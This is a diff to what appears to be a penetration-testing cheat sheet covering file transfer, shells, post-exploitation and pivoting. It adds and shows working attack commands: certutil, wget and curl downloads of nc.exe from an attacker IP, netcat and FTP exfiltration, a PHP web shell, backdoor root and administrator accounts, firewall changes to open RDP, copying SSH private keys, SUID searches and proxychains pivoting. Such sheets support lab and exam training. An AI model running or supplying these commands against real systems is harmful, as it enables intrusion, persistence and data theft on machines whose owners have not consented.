@@ -344,8 +344,13 @@ FILE TRANSFER
        •  Linux & Windows ( Newer Windows versions only )
              ▪  wget http://10.11.0.106/nc.exe -O nc.exe
              ▪  curl http://10.11.0.106/nc.exe  -o nc.exe
+             ▪  Netcat File Transfer :
+                ▪  nc -l -p $port  >  filename
+                ▪  nc -w 3 $<target-machine-ip> $port  < filename       #In our attacking Machine
+             
        • Windows ( Should work on most Windows versions)
              ▪powershell (New-Object System.Net.WebClient).DownloadFile("https://10.10.10.144/test.txt", "test.txt")
+             ▪certutil.exe -urlcache -split -f "http://10.11.0.106:8000/nc.exe" nc.exe
              ▪net use Z: \\computer_name\share_name    //Mount smb share
              ▪$pass= "guest" | ConvertTo-SecureString -AsPlainText -Force
               $cred = New-Object System.Management.Automation.PsCredential('guest',$pass)
@@ -383,8 +388,16 @@ FILE TRANSFER
                    → binary
                    → GET nc.exe
                    → bye
+            ▪ FTP 
+                   →  ftp 10.11.0.106
+                   → annonymous
+                   → annonymous
+                   → put filename
+                   → bye
              ▪ TFTP
                    → tftp -i 10.11.0.106 GET exploit.exe
+                   
+             
 
 
 -------------------------------------------------------------------------------------------------------------------------------------
@@ -405,6 +418,7 @@ SHELLS
        • reset
        • export SHELL=bash
        • export TERM=xterm
+       • export TERM=screen
 
     Php backdoor:
        •  <?php echo shell_exec($_GET['cmd']);?>
@@ -475,12 +489,21 @@ POST EXPLOITATION LINUX
     Add user with root privs:
        •  sudo useradd -ou 0 -g 0 john
        •  sudo passwd John@1234
+       
+    Check permissions ofcurrent user :
+       •  sudo -l
+       •  id
+       •  cat /etc/passwd
+       •  find / -perm -u=s -type f 2>/dev/null     #fidings SUID files
+       •  find / -perm 222 2>/dev/null              #fidings writeable files
+       
 
     Combie shadow and passwd files:
        •  unshadow passwd.txt shadow.txt > passwords.txt
 
     Find listening services:
        •  netstat -alp
+       •  netstat -ano
 
     Copy ssh private kets:
        •  /etc/ssh/ssh_host_dsa_key
@@ -512,8 +535,11 @@ POST EXPLOITATION WINDOWS
        •  net user backdoor backdoor@123 /add
        •  net localgroup administrators backdoor /add
        •  net localgroup "Remote Desktop Users" backdoor /add
-       • net user admin newpassword 
+       •  net user admin newpassword 
+       •  netsh advfirewall show allprofiles state
+       
     Enabling RDP
+       •  netsh advfirewall show allprofiles state
        •  netsh firewall add portopening TCP 3389 "Open Port 3389" ENABLE ALL
        •  netsh firewall set portopening TCP 3389 proxy ENABLE ALL
        •  netsh firewall set service RemoteDesktop enable
@@ -525,12 +551,12 @@ POST EXPLOITATION WINDOWS
 
 
     Check log files of some of the services:
-       •  http
+       • http
        • ftp
        • ssh
 
     Windows Post Exploitation:
-       •  Arp -a 
+       •  arp -a 
        •  netstat -ano 
        •  ipconfig /all 
        •  route print 
@@ -604,7 +630,7 @@ PIVOTING
 
     Dynamic Port Forwading:
           • SSH 
-                  ▪  ssh -D 9000 root@$ip
+                  ▪ ssh -D 9000 root@$ip
                   ▪ set proxychains.conf to 127.0.0.1 1080
                   ▪ proxy chains nc -nv 10.11.0.106
            • Reverse SSH from windows to my kali
@@ -634,6 +660,8 @@ PIVOTING
        •  Dynamic Port Forwading
              ▪ autoroute module
                   → set session to meterpreter session
+             ▪ route add module
+                  → route add  $targer-server $subnet $session-no.       # E.g." route add 10.10.11.0 255.255.255.0 1 "
              ▪ socks4a module
                   → set srv port to ( no need to set host)
              ▪  set proxychains.conf to 127.0.0.1 1080
